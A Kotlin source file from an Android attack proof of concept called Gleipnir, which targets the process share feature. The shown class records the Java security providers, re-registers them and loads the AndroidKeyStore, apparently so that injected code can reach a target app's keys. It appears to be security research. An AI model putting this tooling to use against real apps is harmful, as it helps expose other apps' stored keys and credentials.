/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.security

import org.gleipnir.app.extendableLoader.log
import java.security.KeyStore
import java.security.Security

/**
 * Keystore patcher
 *
 * Provide all Keystore provider's of target application / android default
 */
object KeystorePatcher {

    var providers: Array<java.security.Provider>? = null
    @JvmStatic
    fun init() {
        providers = Security.getProviders()
        Security.getProviders().forEach {
            log("KeyStorePatcher [-] found provider ${it.name}")
        }
    }

    @JvmStatic
    fun patch() {
        Security.getProviders().forEach {
            log("KeyStorePatcher [-] found provider ${it.name}")
        }
        providers?.forEach {
            Security.addProvider(it)
        }
        val keyStore: KeyStore = KeyStore.getInstance("AndroidKeyStore")
        keyStore.load(null)
    }
}